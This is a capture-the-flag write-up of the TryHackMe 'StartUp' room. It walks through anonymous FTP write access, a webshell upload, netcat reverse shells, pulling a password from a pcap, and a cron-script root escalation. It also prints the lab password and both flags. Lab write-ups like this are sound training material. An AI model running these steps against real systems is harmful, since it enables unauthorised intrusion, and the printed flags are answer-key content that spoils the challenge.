# TryHackMe Room Writeup — StartUp

Platform: TryHackMe
Room: StartUp
Difficulty: Beginner

---

# THM ROOM WRITEUPS

## StartUp Room

---

# 1. Reconnaissance

First I scanned the machine using **nmap** and found ports

```bash
nmap -sC -sV 10.129.169.242
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18
```

🟦 **Additional Note**

This command performs:

* `-sC` → runs default Nmap scripts
* `-sV` → detects service versions

🟩 **Key Observation**

Three services discovered:

* FTP (21)
* SSH (22)
* HTTP (80)

---

```
//after this i have enumerate web page but didnot found nay useful informtion
//similarly i also checked ssh but it caanot easily exploited

//so finally i enumerated ftp as we can login in it as 
name:anonyomus
password:
so i got the shell 
and found /ftp directory inside which i can upload files using put command.
for eg : put shell.php
```

---

# 2. FTP Enumeration

Login to FTP:

```bash
ftp 10.129.169.242
```

Login credentials:

```
Name: anonymous
Password: (blank)
```

```
ftp> dir
drwxrwxrwx    2 65534 65534 4096 ftp
important.jpg
notice.txt
```

Navigate into the ftp directory:

```
ftp> cd ftp
ftp> dir
```

Upload a file:

```
ftp> put shell.php
```

🟦 **Explanation**

Anonymous FTP login allowed attackers to:

* Access files
* Upload files
* Potentially upload **webshells**

🟩 **Important Concept**

Misconfigured **Anonymous FTP write access** → common real-world vulnerability.

---

# 3. Directory Enumeration

```
//then i enumerated directories of webpage and found some useful directory as /files where i can uplaod from ftp
//the steps are shown below
//first enumerated directories then uplaod shell.php to get reverse shell 
//shell.php ic created from pentestmonkey using payloads
//then found recipe.txt and recipe i mean ans is : love
```

Run **Gobuster**:

```bash
gobuster dir -u http://10.129.169.242 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Important discovery:

```
/files
```

🟩 **Key Insight**

The `/files` directory is connected to the **FTP upload folder**.

This means:

```
FTP Upload → Accessible from Web
```

Which allows **Remote Code Execution**.

---

# 4. Creating Webshell

```
root@ip-10-129-86-35:~# nano shell.php
```

Upload it through FTP:

```
ftp> put shell.php
```

Then access it from browser.

---

# 5. Reverse Shell

Listener on attacker machine:

```bash
nc -lvnp 4444
```

Then trigger the webshell.

Connection received:

```
Connection received on 10.129.145.70
uid=33(www-data)
```

Upgrade shell:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

🟦 **Important**

Always upgrade shells because:

* interactive terminal
* better command execution

---

# 6. System Enumeration

```
www-data@startup:/$ ls
```

Discovered interesting directories:

```
home
incidents
recipe.txt
```

Navigate:

```
cd /incidents
ls
```

Found:

```
suspicious.pcapng
```

---

# 7. Downloading PCAP File

```
python3 -m http.server
```

Then from attacker machine:

```
wget 10.129.145.70:8000/suspicious.pcapng
```

🟦 **Note**

Target IP must be used while downloading.

---

# 8. Packet Analysis

Open file:

```
wireshark suspicious.pcapng
```

🟩 **Important Discovery**

Found **lennie password** inside network traffic.

Password:

```
c4ntg3t3n0ughsp1c3
```

---

# 9. SSH Login

```
ssh lennie@10.129.145.70
```

Spawn TTY:

```
python -c "import pty;pty.spawn('/bin/bash')"
```

Check files:

```
cat user.txt
```

```
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

---

# 10. Privilege Escalation

Explore scripts directory:

```
cd ~/scripts
```

Files:

```
planner.sh
startup_list.txt
```

View script:

```
cat planner.sh
```

```
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

Check permissions:

```
ls -la /etc/print.sh
```

```
-rwx------ 1 lennie lennie
```

Modify the script to create reverse shell.

---

# 11. Root Shell

Listener:

```
nc -lvnp 4848
```

Connection received:

```
root@startup
```

Verify:

```
whoami
root
```

Get root flag:

```
cat root.txt
```

```
THM{f963aaa6a430f210222158ae15c3d76d}
```

---

# Final Flags

User Flag

```
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

Root Flag

```
THM{f963aaa6a430f210222158ae15c3d76d}
```

---

# Key Skills Practiced

🟩 Reconnaissance with **Nmap**

🟩 FTP exploitation (Anonymous login)

🟩 Webshell upload

🟩 Reverse shell using **Netcat**

🟩 PCAP analysis with **Wireshark**

🟩 SSH access

🟩 Privilege escalation via misconfigured scripts

---

# Personal Reminder

Always check:

```
FTP anonymous login
upload directories
reverse shell access
pcap files
cron scripts
misconfigured permissions
```

---

# End of Writeup
